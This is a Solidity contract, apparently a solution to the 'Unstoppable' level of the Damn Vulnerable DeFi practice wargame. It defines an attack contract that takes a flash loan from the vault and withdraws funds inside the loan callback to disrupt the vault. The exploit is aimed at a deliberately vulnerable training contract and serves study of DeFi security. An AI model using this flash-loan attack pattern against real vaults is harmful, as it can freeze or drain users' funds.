// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import { ReceiverUnstoppable } from "./ReceiverUnstoppable.sol";
import { UnstoppableVault, ERC20 } from "./UnstoppableVault.sol";
import { DamnValuableToken } from "../DamnValuableToken.sol";
import { IERC3156FlashBorrower } from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract UnstoppableHack is IERC3156FlashBorrower {
    UnstoppableVault private immutable vault;

    constructor(address _vault) {
        vault = UnstoppableVault(_vault);
    }

    // The receiver (our hack contract) must specify this function, saying what it will do with the funds!
    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata) external returns (bytes32) {
        ERC20(token).approve(address(vault), amount);
        // ERC4626 withdraw: (assets, receiver, owner)
        // Burns owner's shares and gives receiver their assets. (Should be same person in our case).
        vault.withdraw(1 ether, address(this), address(this));
        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }

    function attack(uint256 value) public {
        vault.flashLoan(this, address(vault.asset()), value, bytes(""));
    }
}